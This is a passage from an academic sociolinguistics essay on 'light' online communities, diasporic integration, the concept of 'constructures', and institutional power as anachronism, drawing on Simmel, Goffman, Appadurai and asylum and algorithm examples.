“It is only a superficial attachment to linguistic usage (a usage quite adequate for daily practice) which makes us reserve the term ‘society’ for permanent interactions only. More specifically, the interactions we have in mind when we talk about ‘society’ are crystallized as definable, consistent structures such as the state and the family, the guild and the church, social classes and organizations based on common interests”.
We have already encountered the same tendency towards preferring such “thick” and permanent forms of organization in the work of Parsons, who focused on the governing pattern of “values” and their integrative effects to characterize society while smaller and “lighter” social groups were said to be tied together by “norms” – with the interactions between both often resulting, sometimes, in contradictions and disorder. This hierarchical ranking in which ‘society’ is presented as organized, primarily, by strong ties within “thick” communities such as those listed by Simmel (the state, church, etc.) and, secondarily, by ‘lighter’ ties within a plethora of social groups, of course did not prevent attention to the latter. But studies of smaller social sub-groups often articulated an awareness of their relatively superficial and ephemeral character. See, for instance, how Bourdieu & Passeron describe the Parisian student community of the 1960s (1964: 54-55, French original, my translation):
“…the student milieu is possibly less integrated today than ever before (…) Everything leads us, thus, to doubt whether students, effectively, constitute a homogeneous, independent and integrated social group”.
Homogeneity, independence or autonomy, and level of integration, thus, determine the nature of students as a social group. Bourdieu & Passeron clearly see students as ‘less’ of a social group than, for instance, social class; and one should not be carried away by the lure of superficial groupness:
“Students can have common practices, but that should not lead us to conclude that they have identical experiences of such practices, or above all a collective one.” (1964: 24-25)
Precisely the same argument was used by Goffman in Encounters (1961), when he described poker players as a tightly focused community of people otherwise unacquainted, in which clear and transparent rules of conduct were shared (and assumed to be shared as soon as someone joins a poker game). Goffman saw such brief moments of tight but temporary and ephemeral groupness as aggregations of people sharing just the rules of the encounters (a microhegemony, we can say), but little beyond it. Such ‘light’ groups could be studied as a way to arrive at insights into fundamental social procedures such as socialization and identity development (see e.g. Becker et al. 1961 for a classic). But when it comes to understanding ‘society’, attention should go to the ‘thick’ communities, and amendments to the established set of “thick” communities, potentially dislodging the consensus about its consistency and stability, invariably led to considerable controversy.[29]
Simmel, as we saw, expressed an awareness of the conventional – untheorized – nature of this consensus about the scope of ‘society’. And after mentioning “the state and the family, the guild and the church, social classes and organizations based on common interests” as the stereotypical arenas for “permanent interactions”, he goes on:
“But in addition to these, there exist an immeasurable number of less conspicuous forms of relationships and kinds of interaction. Taken singly, they may appear negligible. But since in actuality they are inserted into the comprehensive and, as it were, official social formations, they alone produce society as we know it. (…) On the basis of the major social formations – the traditional subject matter of social science – it would be similarly impossible to piece together the real life of society as we encounter it in our experience.” (Simmel 1950: 9)[30]
In other words – and here is a methodological invective of considerable importance – if we intend to understand “society as we know it”, we need to examine these “less conspicuous forms of relationships and kinds of interaction” not instead of but alongside “the major social formations”. We can only get access to the necessarily abstract ‘society’ by investigating the on-the-ground micropractices performed by its members, taking into account that these micropractices may diverge considerably from what we believe characterizes ‘society’ and may eventually show complex ties connecting practices and features of social structure (cf. Collins 1981).[31]
The problem is familiar for sociolinguists: ‘Language’ with a capital L can only be examined by investigating its actual situated forms of usage; and while we prefer to define Language as a stable, autonomous and homogeneous object, the actual forms of usage are characterized by bewildering variability, diversity and changeability. I already explained that, in addition, sociolinguists began to understand quite a while ago that very little can be learned from Language (with a capital L) about the actual social functions and effects of language. In other words: understanding what language is and does, in the realities of social life, forces us to take the variable, diverse and dynamic actual forms of language usage (“speech”) as our object, even if they cannot immediately be squeezed into a normative framework of Language. Even more: a privileged site for research, offering analytical breakthroughs of momentous importance, are small and highly heterogeneous peer groups where the boundaries of languages, and of the “major social formations”, are blurred (e.g. Gumperz 1982; Rampton 2006; Harris 2006; Jörgensen 2008).
We can extend these insight now and bring them into the broader field of social action. The theoretical core of what follows can be summarized in this way:
Online social practices generate a broad range of entirely new forms of “light” community;
In the online-offline social contexts we inhabit, understanding social action requires attention to such “light” groups alongside “thick” groups;
Because in the everyday lived experience of large numbers of people, membership of “light” communities prevails over that of “thick” communities;
“Light” communities, thus, display many of the features traditionally ascribed to “thick” communities. Even more: if we wish to comprehend contemporary forms of social cohesion, we need to be aware of the prominent role of “light” communities and “light” practices of conviviality as factors of cohesion.
Let me briefly elaborate the very first point. For those who wonder whether the internet has created anything new in the way of social formations: yes, it has. Social media, in particular, have generated groups never previously attested: tremendously large communities of users, who – contrary to television audiences – actively contribute to the contents and interaction patterns of new media. Facebook’s 1,79 billion users constitute a media-using community that has no precedent in history; the approximately ten million people who play the mass online game World of Warcraft are another type of unprecedented community; and so are the 50 million people who use the Tinder dating app to find a suitable partner.
All of these communities are formed by individuals voluntarily and actively joining them to perform entirely novel forms of social practice. Membership of such groups is experienced by many of its members as indispensible in everyday life, even if the practices performed in such groups would not always be seen as vital or indicative of one’s core identity – these are “light” groups and practices. But in addition to these voluntary communities, the internet generates involuntary communities as well through its algorithmic functions, bringing people together in networks of perceived shared interests and profiles, of which members are often unaware. The internet, thus, generates a range of new performed identities as well as a range of new ascribed identities; whereas the former usually function as spaces for interpersonal interaction and knowledge exchange among users, the latter’s function is opaque for the ascribed members, who are categorized in term of third-party priorities ranging from marketing to intelligence gathering and security concerns.
Having established this elementary point, I must now turn to the online-offline nexus and review some relevant research on how the interplay of online and offline identity resources enables such specific forms of communities to be formed.
In a recent paper, Ico Maly and Piia Varis (2015) show how the now well-known urban “hipster” community must be seen as a typical instance of Appadurai’s vernacular globalization. While hipsters have become a globalized phenomenon, their actual occurrence, characteristics and social positions are locally determined, jointly yielding a polynomic and microhegemonic identity field. The global features of the groups are largely internet-based imageries of lifestyle, consumption ethos, outlook and commodity orientation (think of the coffee cult, beards, skinny jeans, iPhones and vintage glasses as emblematic features), and the internet offers, as Maly & Varis demonstrate, a mountain of “how to” resources for aspiring (or insecure) hipsters around the world. The internet, thus, functions as a learning environment for the various norms that shape and police hipster culture. Included in such norms are fine discursive identity distinctions that refer to the hipster label itself:
“We can thus distinguish social groups that dress like hipsters, share an identity discourse based on authenticity, and frequent hipster places. They distance themselves from another group of people they call hipsters: a ‘real’ hipster is someone who rejects being part of a social group, and thus also rejects the hipster label which is reserved for people who desperately want to be ‘hip’ and are thus not ‘real’ or authentic. Nor are they true innovators or trendsetters, which the individualistic, authentic hipsters are.” (Maly & Varis 2015: 10)
Thus, there is a strong tendency to self-identify as a non-mainstream, “authentic”, countercultural individualist, which, however, goes hand in hand with an exuberant and highly self-conscious neoliberal (and, thus, mainstream) consumerism, supported by a globalized “tight fit” fashion industry. As an effect, this quest for individualism results in a remarkable, global, degree of uniformity. Hipsters are eminently recognizable as hipsters, even if local accents do count and carry local identity values, and even if the usual fractality of orders of indexicality allows for emerging subdivisions within hipsterdom, such as the “mipster” (Muslim Hipster).
Maly and Varis propose the term “translocal micro-population” to describe hipsters, and it is easy to think of other globalized lifestyle communities for whom this label might be suitable – think of HipHop, Rasta, Metal or Gothic communities, but also of “fashionistas” and “foodies”, of Premier League soccer fans and so forth. All these micro-populations could be more finely described as groups of people who are translocally connected as what we could call communities of knowledge, while locally they occur as communities of practice. The latter term is better known, and Lave & Wenger (1991) used it to describe groups whose frequent interaction provides a learning environment for rules and norms – not unlike Goffman’s (1961) acquaintances in their encounters or Becker et al.’s (1961) medical school students – and knowledge is evidently, in Lave & Wenger’s view, an ingredient of practice.
Theirs was, however, an “offline” description, and what we see in the context of hipsters and other contemporary globalized lifestyle groups is that the internet has become an infrastructure for separate and specific forms of knowledge gathering and circulation not constricted by the experiences of face-to-face interaction, and so enabling a far wider scope and depth of scaled and polycentric community formation. We are facing a new type of social formation here: a “light” community that differs from the “major social formations” listed by Simmel, transcending the diacritics often thought to be essential in understanding social action, and (returning to Bourdieu and Passeron’s criteria of social groupness) displaying a high degree of homogeneity, autonomy and integration over and beyond their diversity.
The capacity of the internet for generating such translocal communities of knowledge is immense, and we are only beginning to explore this phenomenon – and to take it seriously as a relevant feature of the sociological imagination. Such communities of knowledge are usually just that: online communities or “fora” where information on an endless variety of topics is exchanged and debated (e.g. Kytölä 2013; Hanell & Salö 2015; Mendoza-Denton 2015). But the internet has also enabled the emergence of a new form of translocal political community mobilization, and it is impossible to understand contemporary political and social dynamics without looking into such web-based communities of knowledge (cf. McCaughey & Ayers 2003; Graeber 2009). In fact, some of the most high-profile political events of the past decade were internet phenomena: Wikileaks and its release of hacked classified documents, the Panama Papers revealing shocking amounts of money hidden in offshore tax havens, and the alleged Russian hacking of the Democratic Party computers and its possible effect on the election of Donald Trump as US president in November 2016 (e.g. Brevini et al 2013).[32] And in recent years, communities that started online have won offline electoral victories as bona fide political parties – think of Syriza in Greece and Podemos in Spain.
Such processes of online community formation also occur where one would least expect it, and some of the most impressive findings come from China, a country known to maintain a restrictive internet censorship policy. Caixia Du’s (2016) study of the online activities of the Chinese precariat can serve to illustrate this. Due to China’s economic surge, millions of young and highly educated people have become employed in precarious administrative jobs. These people, Du argues, share acute feelings of disenfranchisement: low income and insecure jobs have placed them in the margins of a society increasingly focused on material success and conspicuous consumption. Since they are digitally literate and since there are hardly any spaces for unimpeded sociopolitical dissidence in China, they articulate and share these experiences online. Du describes how this large community – a “class in the making” as she calls it – develops its own secret language through the clever manipulation of memes, sufficiently sophisticated to mislead the censor’s search engines. The community also constructs and shares an emblematic “culture” called e’gao and revolving around parody and persiflage of prestigious cultural objects; and its members have created a distinct identity label for themselves: diaosi, a derogatory term signifying “losers” (see also Li et al. 2014; Yang et al. 2015). These ‘soft’, cultural practices, Du insists, show the gradual coming into being of a previously non-existent social formation in China: a large precariat, critical of the government and billionaire elites and a potential source of large-scale social unrest in China. And all of this happens online.
“Light” communities, we can see, appear to have “thick” characteristics and modes of practice. There are reasons to believe, consequently that the “light” practices that characterize so much of the online interactions – think of liking, endorsing, sharing, retweeting on social media – are not as light as one might think. Their main functions, one suggests, are the establishment and maintenance of relationships of conviviality (Varis & Blommaert 2013). But we should not forget that conviviality is an elementary and crucial form of social conduct within established communities – very much like greeting neighbors or exchanging Christmas wishes with friends and relatives. They could thus, as well, be seen as “light” practices with a “thick” effect: social cohesion, within online groups and, increasingly, also spilling over into the offline world.
4.6 A polycentric theory of social integration
“Integration” continues to be used as a keyword to describe the processes by means of which outsiders – immigrants, to be more precise – need to “become part” of their “host culture”. I have put quotation marks around three crucial terms here, and the reasons why will become clear shortly. “Integration” in this specific sense, of course, has been a central sociological concept in the Durkheim-Parsons tradition. A “society” is a conglomerate of “social groups” held together by “integration”: the sharing of (a single set of) central values which define the character, the identity (singular) of that particular society (singular). And it is this specific sense of the term that motivates complaints – a long tradition of them – in which immigrants are blamed for not being “fully integrated”, or more specifically, “remaining stuck in their own culture” and “refusing” to integrate in their host society.
Half a century ago, in a trenchant critique of Parsons, C. Wright Mills (1959: 47) observed that historical changes in societies must inevitably involve shifts in the modes of integration. Several scholars documented such fundamental shifts – think of Bauman, Castells, Beck and Lash – but mainstream discourses, academic and lay, still continue to follow the monolithic and static Parsonian imagination. I what follows I want to propose that new modes of diaspora, now conditioned by access to new forms of mediated communication, do indeed result in new modes of integration.
To formulate this as a theoretical proposition: people must be integrated in a wide variety of communities, both “thick” and “light” ones, and to differing degrees. A “completely integrated” individual is an individual who has achieved such diverse forms of integration and is able to move from one community to another one while shifting the modes of integration expected in each of them.
Let us look at some corroborating research. In a splendid dissertation, Jelke Brandehof (2014; for a similar study, see Nemcova 2016; also Tall 2004) investigated the ways in which a group of Cameroonian doctoral students at Ghent University (Belgium) used communication technologies in their interactions with others. She investigated the technologies proper – mobile phone and online applications – as well as the language resources used in specific patterns of communication with specific people. Here is a graphic representation of the results for one male respondent (Brandehof 2014: 38).
This figure, I would argue represents the empirical side of “integration” – real forms of integration in contemporary diaspora situations. Let me elaborate this.
The figure, no doubt, looks extraordinarily complex; yet there is a tremendous amount of order and nonrandomness to it. We see that the Cameroonian man deploys a wide range of technologies and platforms for communication: his mobile phone provider (with heavily discounted rates for overseas calls) for calls and text messages, skype, Facebook, Beep, Yahoo Messenger, different VOIP systems, Whatsapp and so forth. He also uses several different languages: Standard English, Cameroonian Pidgin, local languages (called “dialects” in the figure), and Fulbe (other respondents also reported Dutch as one of their languages). And he maintains contacts in three different sites: his own physical, economic and social environment in Ghent, his “home environment” in Cameroon, and the virtual environment of the “labor market” in Cameroon. In terms of activities, he maintains contacts revolving around his studies, maintaining social and professional networks in Ghent, job hunting on the internet, and an intricate set of family and business activities back in Cameroon. Each of these activities – here is the order and nonrandomness – involves a conscious choice of medium, language variety and addressee. Interaction with his brother in Cameroon is done through smartphone applications and in a local language, while interactions with other people in the same location, on religious topics, are done in Fulbe, a language marked as a medium among Muslims.
Our subject is “integrated”, through the organized use of these communication instruments, in several “cultures” if you wish. He is integrated in his professional and social environment in Ghent, in the local casual labor market where students can earn a bit on the side, in the Cameroonian labor market where his future lies, and in his home community. Note that I use a positive term here: he is “integrated” in all of these “zones” that make up his life, because his life develops in real synchronized time in these different zones, and all of these zones play a vital part in this subject’s life. He remains integrated as a family member, a friend, a Muslim and a business partner in Cameroon, while he also remains integrated in his more directly tangible environment in Ghent – socially, professionally and economically. Note, of course, that some of these zones coincide with the “thick” groups of classical sociology – the nation-state, family, religion – while others can better be described as “light” communities – the student community, the workplace, web-based networks and so forth.
This level of simultaneous integration across cultures (if you wish), both “thick” and “light” ones, is necessary. Our subject intends to complete his doctoral degree work in Ghent and return as a highly qualified knowledge worker to Cameroon. Rupturing the Cameroonian networks might jeopardize his chances of reinsertion in a lucrative labor market (and business ventures) upon his return there. While he is in Ghent, part of his life is spent there while another part continues to be spent in Cameroon, for very good reasons. The simultaneity of integration in a variety of communities, however, should not lead us to suggest that the degrees of integration would be similar. We can assume that our subject is more profoundly integrated in, for instance, his family and religious communities in Cameroon, than in the Ghent-based casual labor market where he needs to rely on the advice and support of others to find his way around.
I emphasized that our subject has to remain integrated across these different zones – sufficiently integrated, not “completely” integrated. And the technologies for cheap and intensive long-distance communication enable him to do so. This might be the fundamental shift in “modes of integration” we see since the turn of the century: “diaspora” no longer entails a total rupture with the places and communities of origin; neither, logically, does it entail a “complete integration” in the host community, because there are instruments that enable one to lead a far more gratifying life, parts of which are spent in the host society while other parts are spent elsewhere. Castells” “network society” (1996), in short. We see that diasporic subjects keep one foot in the “thick” community of family, neighborhood and local friends, while they keep another foot – on more instrumental terms – in the host society and yet another one in “light” communities such as internet-based groups and the casual labor market. Together, they make up a late-modern diasporic life.
There is nothing exceptional or surprising to this: the jet-setting European professional business class does precisely the same when they go on business trips: smartphones and the internet enable them to make calls home and to chat with their daughters before bedtime, and to inform their social network of their whereabouts by means of social media updates. In that sense, the distance between Bauman’s famous “traveler and vagabond” is narrowing: various types of migrants are presently using technologies previously reserved for elite travelers. And just as the affordances of these technologies are seen as an improvement of an itinerant lifestyle by elite travelers, it is seen as a positive thing by these other migrants, facilitating a more rewarding and harmonious lifestyle that does not involve painful ruptures of existing social bonds, social roles, activity patterns and identities.
What looks like a problem from within a Parsonian theory of “complete integration”, therefore, is in actual fact a solution for the people performing the “problematic” behavior. The problem is theoretical, and rests upon the kind of monolithic and static sociological imagination criticized by C. Wright Mills and others, and the distance between this theory and the empirical facts of contemporary diasporic life. Demands for “complete integration” (and complaints about the failure to do so) can best be seen as nostalgic and, when uttered in political debates, as ideological false consciousness. Or more bluntly, as sociological surrealism.
4.7 Constructures
In social science, social structure is very often used as a target of analysis – one intends to say something about the “structural” level of social organization; and it is also often used as a methodological tool – one identifies a level of social reality called “structure”, and such structures contribute to the analysis of the case examined. Some of the most epochal and influential social-scientific work was work addressing just that: the emergence and solidification of “structural” dimensions of society – think of the work of Parsons (1937) or that of Giddens (1984). “Structure”, it seems, is the most “macro” dimension of social life, and “structural” is the most general level of statements made in its analysis. In Fernand Braudel’s famous distinctions in time-scales, the “structure” was situated in the realm of the longue durée: the time of civilizations, of modes of production, of the climate and the demography of parts of the world (e.g. 1969; 1981). And for C. Wright Mills and several others – think of Weber and Parsons – social structure can be described mainly by attention to the institutional orders within the nation-state, and “[i]f we understand how these institutional orders are related to one another, we understand the social structure of a society” (Mills 1959: 134). The consensus appears to be that “structure” refers to phenomena at the level of “the total society” (Mills 1959: 137) and show a persistent, slowly developing character. In that sense, work such as that of Appadurai (1996) and Castells (1996) addresses newly emerging structures. By the same token, of course, teleological models of social evolution, such as those of Hegel and Marx, would be “structural”.
One will have some difficulty finding detailed descriptions of what “structure” actually is, how it can be empirically identified and how it relates to the chaotic specifics of the everyday social processes we can observe. Attempts such as those of Giddens – who was explicit in his definitions of structure – remain open to critique and controversy (see e.g. Thompson 1984, chapter 4). Mostly, “structure” is used in a loosely defined way, in the sense I outlined above. And once more, if we use what we know about language in social life as the fundamental imagery for social science, we may offer a somewhat more precise set of formulations.
Let me first sketch the field of arguments in which I shall situate my proposals. I wish to steer clear from two quite widespread frames of reference for discussing structure.
First, “structure”, certainly in a Lévi-Straussian variety of structuralism, has acquired strong suggestions of absoluteness, abstractness, predictability, anonymity, a-temporality and staticity. Structure, as the guiding value system of a society, is that which provides enduring stability to a social system and makes it resilient – as Parsons suggested – to the onslaught of cultural revolutions from within youth culture (Parsons 1964). And even if structure is the outcome of active structuration at a variety of scale levels in social life (Giddens 1984; Thompson 1984), most scholars would still use the term to describe dominant (if not determining) rules, values or principles driving the development of societies across timespace. It is also quite often presented as a social force operating below the level of consciousness and agency of people, a set of tacit and not always “emicly” well-understood aspects of social life – as in the “deep structure” of Chomskyan Transformational Grammar..
Two, “structure” is often seen as something antagonistic to “postmodernist” and “mobility/complexity” approaches to social life. While traditional (“modernist”) social science would be on the side of anonymous static structure, “postmodernist” science would favor individual agency and instability, and thus become at once “poststructuralist” – in an unrealistic either/or frame in which methodological preferences appear to lead directly to ontological strictures.[33] It is rarely observed that scholars such as Bourdieu and Foucault did not just reject any concept of structure but reject a specific one: the Lévi-Straussian one referred to above. They rejected a certain kind of structuralism (“poststructuralism” would be more accurately defined as “post-Lévi-Straussism”) but not “the structural” as a dimension of social systems. In general, this false antagonism often renders more nuanced understandings of structure invisible.
Many fail to recognize that complexity is not the absence of order, but a different kind of order. I shall therefore use another term to make my point. Rather than using “structure”, I shall use “constructure” in what follows. New terms enable us to examine the validity of the older ones, and they also afford some measure of detachment from unwarranted intertextual readings. “Constructure” is not technically speaking a neologism – it is an archaic term that offers a nice collocation of “structure” and “construction”. The latter term, as can be seen, can easily be changed into “agency”, and so we have a concept in which both dimensions, often seen as antagonistic, are heuristically and analytically joined.
The baseline assumption – one that, I hope, is entirely uncontroversial – is that any social event is structured: there is always “order” in any observed social event. But from a complexity perspective on sociolinguistic phenomena and processes, this order is always:
Dynamic and unstable: order is always a temporally contingent quality because systems are perpetually unfolding and changing; (E.g. describing language at one point in time will necessarily result in a description which is different from what was current a generation ago, as well as from what will be current in the next generation).
Unfinished and stochastic: given the perpetual change, any momentary observation of “order” will contain open-ended, quickly evolving features anticipating new forms of “order”; it will also contain features that are contested and conflictual, and features in the process of being eliminated or established; (E.g. archaisms and neologisms, short-lived as well as more lasting ones, are always part of any synchronic observation of language). It is stochastic in the sense that today’s structure might be yesterday’s exception, and that outcomes are quite often not predictable from initial conditions, but “accidental” or deviant in terms of what was seen as dominant.
non-unified: any “order” consists of a mixture of different forces, developing at different speeds and with different scope and range; (E.g. the different registers and genres in anyone’s repertoire have different speeds of development, with “standard” registers usually slower in development than e.g. youth registers – hence our sense of “trendiness”).
As just noted, we are used to reserve the term “structure” for the slower, more persistent forces, the durée, the macro dimension of social processes I suggest we avoid this micro-macro distinction and consider the entire mix when we use the term “constructure”, because given the complexity perspective, there is no telling a priori which of the features in the mix will determine future developments – change often happens in the margins and begins a statistical minority or exception, often negatively qualified. Think of the spectacular rise of emoticons as part of several mainstream genres of writing nowadays. Emoticons have not replaced the conventional forms of alphabetic writing – we still write from left to right, and we still use the conventional “orthographic” symbols we associate with the written form of the language we are using. Emoticons have been added to the mix of contemporary writing, so to speak, they represent what we could call a “light” feature, blended with the “big” features of conventional orthography. In terms of functions, too, we should not associate “structure” a priori with “thick” functions but do justice to “light” functions such as that of conviviality, discussed above. They are, as we saw, only “light” from the kind of transcendental structuralism I dismissed at the outset.
Constructures are, thus, a permanently unfolding mix of various separate “structures”, the momentary deployment of which in social practice grants the latter a degree of orderliness, recognizable and ratifiable for others.
Going back to our theory of social action, we can see how in constructures, we can unify traditional notions of “structure” and “agency”. Slightly rephrased, we have a tool for recognizing two essential characteristics of social life, and we already discussed it above – iterativity and creativity. Most of the behavior we deploy socially is overwhelmingly iterative, but slightly inflected by unique, creative and situated performativity. Observe, however, that I do not equate iterativity with stability and creative performativity with change. The entire mix is continuously changing, including the “iterative” aspects of it. Detaching the performative “accent” from the iterative “structure” obscures the fact that, for people in everyday practice, the “accent” is often the essence of what they perceive as meaningful in social action. And it is by means of the performative “accent” that the iterative features of behavior are also transformed into unique and creative characteristics of specific social actions performed by specific people. All of this was made clear earlier, when we discussed the genre theory of social action; its relevance here is evident.
Rather than as a concept that points towards the stability of social systems – the simplistic interpretation of “structure”, noted above – constructure thus points to the permanently changing nature of social systems and to the way they change. When we read Erving Goffman’s observations on social life in the US of the 1950s and 1960s, we can still recognize a great deal of it today, even if much of our social life these days is performed in a social space that didn’t exist in Goffman’s world: the virtual space of social media. Interaction in this virtual world is organized along different sets of norms many of which differ strongly from the ones Goffman detected in face-to-face engagements. Online sociality, however, has not replaced the Goffmanian world of social interaction – the mix has changed. Which is why we can still recognize ourselves in Goffman’s work, even if we realize that large chunks of our lives are led in very different ways. The constructures have changed.
4.8 Anachronism as power
Finally, I also propose a theory of power; not a general one (power per se) but a specific one, about one kind of institutional power. Two points of departure underlie the effort here.
In The Utopia of Rules, David Graeber describes the fundamental stupidity of contemporary bureaucratization, observing the spread of what he calls “power without knowledge”: “where coercion and paperwork largely substituted for the need for understanding (…) subjects” (2015: 65). The contemporary power of bureaucrats often involves an assumption of total knowledge (articulated, e.g. in Foucault’s work). Graeber, however, disagrees: “situations of structural violence invariably produce extremely lopsided structures of imaginative identitification” (69): rulers have no clue about who and what their subjects are, what it is they do, what they attach importance to, how they live. The schematization and simplification of bureaucracy serve as a substitute for intimate and experience-based knowledge, but evidently fail to match up to that.
A decent amount of applied-linguistic work, notably on bureaucratic procedures such as asylum applications, shows how transnational subjects, often carrying the traces of a checkered diasporic biography, are nonetheless caught in administrative templates in which their “origins” are determined on the basis of imaginations of nation-state regimes of bureaucratic identity and on “modernist” theories of language (cf. Maryns 2006; Blommaert 2001, 2009; Jacquemet 2015). Concretely: if applicants’ claims as to origin (being from country X) are being disputed, knowledge of the official, national languages of Country X is used as a definitive test. If one fails this criterion, asylum is being denied. The same happens whenever an applicant provides discourse which is sensed to violate the rules of denotational purity: whenever s/he produces contradictions, silences, a muddled chronology or a lack (or overload) of detail, the applicant is judged to be untrustworthy and the success of his/her application is jeopardized.
The “lopsided structures of imaginative identification” described by Graeber, we can see, in actual fact assume the shape of anachronisms: schemes of social imagination, and thus of patterns of meaning-making, perhaps valid in an earlier stage of development, but not adjusted to recent changes and thus inadequate to do justice to the phenomenology of present cases. At the same time, these obsolete schemata are strongly believed to have an unshakeable, persistent relevance as a rationality of administrative information-organization, and are enforced from within that rationality. Thus, an important part of contemporary institutional power is based on anachronisms.
Anachronisms are, of course, an inevitable feature of social change, and we know that governmentality – the logic of institutional bureaucracy and governance – is widely characterized by inertia. It represents a segment of society which develops more slowly than the segments it is supposed to deal with. The gap between the phenomena to be addressed, and the schemata by means they are addressed, is a grey zone of uncertain understanding and often arbitrary judgment – and thus, increasingly, of miscarriage of justice and of litigation.
In terms of research, such anachronistic gaps offer a very rich site for investigating social change itself. It is based on the general image of social change described elsewhere: an image of different layers developing at different speeds. The different speeds manifest themselves in actual, situated cases of misunderstanding (or rather: the incapacity for understanding) and/or of experienced injustice.
The awareness of anachronisms is nothing new, needless to say. Durkheim’s own efforts, we have seen, were grounded in his conviction that “society” had not been adjusted to an important range of innovations caused by the industrialization and urbanization of France. Similar views, of an old social order being crushed under the weight of a new one, are widespread in the sociological literature. What this theory of anachronisms as power now offers, is accuracy. When earlier generations saw “society” being ill adapted to innovation, they couldn’t possibly mean all of society, for the parts that had been innovated were also very much part of that society. What we can contribute, therefore, is a highly precise focus when we look at such phenomena. The anachronisms are particular modes of organizing social interaction through specific patterns of meaning-making: categorization, the connection of different phenomena, objects or persons in specific sets of relationships to each other (as when an asylum seeker is brought in a certain relationship with national languages in determining his/her origins), patterns of argumentation and the ways in which we attribute judgments of persuasiveness to certain such patterns. My proposed theory enables us to look for very precise objects of analysis that can document change and the anachronistic effects that accompany it.
Evidently, the internet as an infrastructure that has brought substantial innovation to the modes of social interaction now common around the world, is prone to such anachronisms. It is a segment of contemporary social life that develops at very high speed, while our modes of meaning-making are slow to be synchronized. Thus, we talk about, and in, new modes of internet communication very much in ways reflecting an pre-internet complex of social relationships. A very clear and simple example of this is the fact that Facebook, the largest social media platform in the world founded in 2004, uses one of the oldest and most primitive terms in the vocabulary for human relationships as its core tool: “friends”. Evidently, Facebook “friends” are not necessarily coterminous with offline friends. Facebook also uses a similarly ancient and primitive term to describe the most common interaction function on its platform: “like”. And evidently, this “like” function covers a very broad and extraordinarily heterogeneous range of actual meanings. No-one needs to actually like an update in order to “like” it, and no-one needs to be an actual friend in order to become a Facebook “friend” (which is why s/he can be easily and swiftly “defriended” whenever differences of opinion arise).
Those are of course innocuous phenomena, merely indexing the anachronistic gaps caused by developments in social media. Less innocent, but very difficult to pinpoint, are the effects of some of the organizing principles behind social media: the algorithmic engines used by e.g. Google and Facebook to bring people, messages and zones of social activity together on the basis of aggregations of huge amounts of data and metadata generated by users. These algorithms, as mentioned earlier, cannot be not be directly examined. But some of their effects are known.
All of us, I am sure, have at times error-clicked some advertisement on a social media page – let’s say, an advertisement for the newest model of urban SUV by Peugeot. All of us must have noticed how in the days following that erroneous click, multiple advertisements for cars appear on almost any page we open, usually cars in the same price range as the Peugeot we error-clicked. Less visible, perhaps, is the fact that in our social media newsfeeds, we are likely to encounter more people who recently clicked such advertisements in the days following our error-click, most likely people from our contacts network and people in the same geographical area as us. And also less visible, perhaps, is the fact that our perceived interest in cars of a certain brand and price range will be correlated with other data we produce through our social media usage – other products we express an interest in, other aspects of lifestyle, other persons, perhaps political views or preferences for certain sports or sports teams – all of this resulting in a permanently updated “algorithmic identity”, of certain interest for marketing and security professionals, over which we ourselves do not have any control, let alone agency.[34]
Although we can, as I said, gauge these procedures from a distance only, we can infer from what we know that these algorithms are anachronisms too. They are overwhelmingly linear and reductionist: linear, for clicking an item is interpreted as necessarily rational and deliberate – the mind-reading procedures of the algorithm exclude the possibility that we clicked the button by accident. And reductionist in the sense that clicks are seen as inspired by very specific forms of interest in the thing we clicked – an interest, for instance in buying that object rather than to just admire it or confirm our opinion that such things are absurdly expensive.
The algorithmic identities thus ascribed to us may be light years removed from the actual motives driving our social conduct and from the ways in which we see ourselves. Well known, for instance, is that at a certain time when terrorism alert worldwide was red-hot, Googling for information on pressure cookers was algorithmically flagged as suspicious because these mundane receptacles happened to be widely used in manufacturing home-made explosive devices. Which is an activity performed, fortunately, by very few individuals; but in order to locate these individuals, a great many more must have come under close scrutiny by security and intelligence officials – for no reason other than, perhaps, they contemplated buying a very nice pressure cooker so as to boost the quality of their bowl of evening soup.
Patterns of human interaction and meaning-making are the most sensitive indicators of social change – every neologism in our everyday language usage demonstrates this. If we wish to understand the fine grain of social change, close attention to these patterns is therefore sure to offer far more analytical purchase than almost any other aspect of social life. Power, too, can be investigated by looking at the anachronisms characterizing patterns of interaction and meaning-making deployed in governance; it can be looked at in very great detail.
The sociological re-imagination
The world which was puzzling Durkheim has changed and has become the world of Castells and Appadurai. It has changed constructurally: parts of that old world persists while entirely new parts have entered it, most prominently a new global infrastructure for sociality – the internet – which affects the entire planet, including those segments of it where it is rare or absent. The interplay of these different parts demands a new sociological imagination, and my effort towards that goal was guided by a simple assumption: that a number of insights into contemporary patterns of social interaction can be generalized and provide a sociolinguistically animated re-imagination of the social world, characterized by what Arjun Appadurai called “vernacular globalization”.
Recall what Appadurai meant by this delicate concept: the fact that globalized societies (and there are none that are not globalized) must be comprehended through the interplay of large and small “structures”, if you wish, through disciplined attention to the big translocal things and their interactions with the small local ones – what Arnaut et al. (2017) aptly call the “poeisis-infrastructures nexus”. This nexus is the intersection of locally contextualized practices of meaning making with higher-scale conditions for meaning making. The very object of sociolinguistics, in other words, and what sociolinguistics contributes to social science is precisely that: a meticulously empirical perspective on this nexus, in which the object is the nexus itself and not its – artificially and counterproductively established – “micro” and “macro” dimensions. No contemporary sociolinguist can afford to examine the facts of language in society without considering simultaneously and as part of the same phenomenon, the “micro” facts of situated discourse and their “macro”-sociolinguistic conditions of becoming and performance (cf. Blommaert 2005). This nexus-object enables us now to propose an empirically grounded (and thus non-speculative and non-“metaphysical”) sociological re-imagination – an imagery in which “the framework of modern society is sought, and within that framework the psychologies of a variety of men and women are formulated”, to repeat C. Wright Mills’ famous words.
Sociolinguistics does, however, more than that. Theories derived from its evidence cannot subscribe to Methodological Individualism (let alone Rational Choice), as I hope to have established convincingly in section 3 above. They are inevitably grounded in that essential and irreducible social dimension of human life: interaction between people in a comprehensible, and therefore shared, meaningful code following a set of “grammars” as I called it earlier. All the theories I have proposed here, therefore, contradict and invalidate individualistic views of human behavior, including so-called “neoliberal” views of unconstrained social action. If “action” is “interaction”, it is only partially open to choice, and it is entirely controlled and constrained by the resources available and accessible to the interlocutors and to normative-evaluative uptake by others. Our freedom as social agents, to paraphrase this in a different jargon, is seriously curtailed (and has to be) as soon as we try to communicate it to others. It remains perplexing to see that a part of social theory has not come to terms with this elementary – defining – fact of communication.
